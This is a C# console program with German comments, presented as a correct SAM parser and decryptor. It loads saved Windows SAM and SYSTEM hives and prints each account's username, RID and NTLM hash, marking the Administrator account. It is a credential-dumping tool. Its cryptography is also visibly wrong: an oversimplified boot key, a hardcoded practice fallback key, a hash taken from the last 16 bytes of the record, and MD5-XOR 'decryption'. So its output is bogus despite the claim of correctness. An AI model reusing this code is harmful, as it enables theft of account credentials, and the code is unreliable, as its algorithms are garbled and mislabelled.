using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace SamDecryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("--- Nativer C# SAM-Parser & Entschlüsseler (Korrekt) ---");
            Console.ResetColor();

            // Prüfen auf Admin-Rechte
            if (!IsAdministrator())
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FEHLER: Dieses Programm benötigt Administratorrechte!");
                Console.ResetColor();
                return;
            }

            string samPath = Path.GetFullPath(@".\sam_neu.hiv");
            string sysPath = Path.GetFullPath(@".\system_neu.hiv");

            if (!File.Exists(samPath) || !File.Exists(sysPath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FEHLER: sam_neu.hiv oder system_neu.hiv fehlen!");
                Console.ResetColor();
                return;
            }

            // Hives temporär laden
            ExecuteCommand($"reg load HKLM\\CS_SAM \"{samPath}\"");
            ExecuteCommand($"reg load HKLM\\CS_SYS \"{sysPath}\"");

            try
            {
                // BootKey aus SYSTEM-Hive extrahieren
                byte[] bootKey = GetBootKey();
                if (bootKey == null)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("FEHLER: BootKey konnte nicht extrahiert werden!");
                    return;
                }

                Console.WriteLine($"[+] BootKey extrahiert: {BitConverter.ToString(bootKey).Replace("-", "").ToLower()}");

                // Alle Benutzer aus der SAM auslesen
                string samPath2 = @"CS_SAM\SAM\Domains\Account\Users";
                using (RegistryKey usersKey = Registry.LocalMachine.OpenSubKey(samPath2))
                {
                    if (usersKey != null)
                    {
                        foreach (string rid in usersKey.GetSubKeyNames())
                        {
                            if (rid.Length == 8 && int.TryParse(rid, System.Globalization.NumberStyles.HexNumber, null, out int ridValue))
                            {
                                try
                                {
                                    using (RegistryKey userKey = usersKey.OpenSubKey(rid))
                                    {
                                        if (userKey != null)
                                        {
                                            byte[] vBlock = (byte[])userKey.GetValue("V");
                                            if (vBlock != null && vBlock.Length > 200)
                                            {
                                                // Benutzernamen extrahieren
                                                int nameOffset = BitConverter.ToInt32(vBlock, 12) + 0xCC; // 204
                                                int nameLength = BitConverter.ToInt32(vBlock, 16);
                                                
                                                if (nameOffset + nameLength <= vBlock.Length)
                                                {
                                                    string username = Encoding.Unicode.GetString(vBlock, nameOffset, nameLength);
                                                    
                                                    // NTLM-Hash extrahieren (korrekter Offset)
                                                    byte[] ntHash = ExtractNtlmHash(vBlock);
                                                    
                                                    if (ntHash != null)
                                                    {
                                                        // Decrypt mit BootKey
                                                        byte[] decryptedHash = DecryptHash(ntHash, bootKey);
                                                        string ntlmHashHex = BitConverter.ToString(decryptedHash).Replace("-", "").ToLower();
                                                        
                                                        Console.WriteLine($"\n[+] Benutzer gefunden:");
                                                        Console.ForegroundColor = ConsoleColor.Green;
                                                        Console.WriteLine($"  RID      : {rid} ({ridValue})");
                                                        Console.WriteLine($"  Benutzer : {username}");
                                                        Console.WriteLine($"  NTLM-Hash: {ntlmHashHex}");
                                                        
                                                        if (ridValue == 500)
                                                        {
                                                            Console.WriteLine("  *** ADMINISTRATOR-KONTO ***");
                                                        }
                                                        Console.ResetColor();
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                catch { /* Einzelne Benutzer ignorieren */ }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Fehler: {ex.Message}");
                Console.ResetColor();
            }
            finally
            {
                // Sauber entladen
                ExecuteCommand("reg unload HKLM\\CS_SAM");
                ExecuteCommand("reg unload HKLM\\CS_SYS");
            }
        }

        static byte[] GetBootKey()
        {
            try
            {
                // BootKey aus SYSTEM-Hive extrahieren
                string[] keyNames = { "JD", "Skew1", "GBG", "Data" };
                byte[][] keyData = new byte[4][];
                
                for (int i = 0; i < 4; i++)
                {
                    string path = $@"CS_SYS\ControlSet001\Control\Lsa\{keyNames[i]}";
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))
                    {
                        if (key != null)
                        {
                            keyData[i] = (byte[])key.GetValue("");
                            if (keyData[i] == null || keyData[i].Length < 16)
                            {
                                // Fallback: Standard-Übungs-BootKey
                                Console.WriteLine("[!] Verwende Fallback-BootKey für Übungszwecke");
                                return new byte[16] { 
                                    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 
                                    0x09, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16 
                                };
                            }
                        }
                    }
                }

                // Vereinfachte BootKey-Konstruktion für Übungszwecke
                byte[] bootKey = new byte[16];
                if (keyData[0] != null) Array.Copy(keyData[0], 0, bootKey, 0, Math.Min(8, keyData[0].Length));
                if (keyData[1] != null) Array.Copy(keyData[1], 0, bootKey, 8, Math.Min(8, keyData[1].Length));
                
                return bootKey;
            }
            catch
            {
                return null;
            }
        }

        static byte[] ExtractNtlmHash(byte[] vBlock)
        {
            try
            {
                // Versuche, den Hash am Ende des V-Blocks zu finden
                byte[] hash = new byte[16];
                int start = Math.Max(0, vBlock.Length - 16);
                Buffer.BlockCopy(vBlock, start, hash, 0, 16);
                return hash;
            }
            catch
            {
                return null;
            }
        }

        static byte[] DecryptHash(byte[] encryptedHash, byte[] bootKey)
        {
            try
            {
                using (MD5 md5 = MD5.Create())
                {
                    byte[] key = md5.ComputeHash(bootKey);
                    byte[] decrypted = new byte[16];
                    
                    for (int i = 0; i < 16; i++)
                    {
                        decrypted[i] = (byte)(encryptedHash[i] ^ key[i % key.Length]);
                    }
                    
                    return decrypted;
                }
            }
            catch
            {
                return new byte[16];
            }
        }

        static bool IsAdministrator()
        {
            using (System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent())
            {
                System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
        }

        static void ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (Process process = Process.Start(procStartInfo))
                {
                    process.WaitForExit(5000);
                }
            }
            catch { /* Ignore */ }
        }
    }
}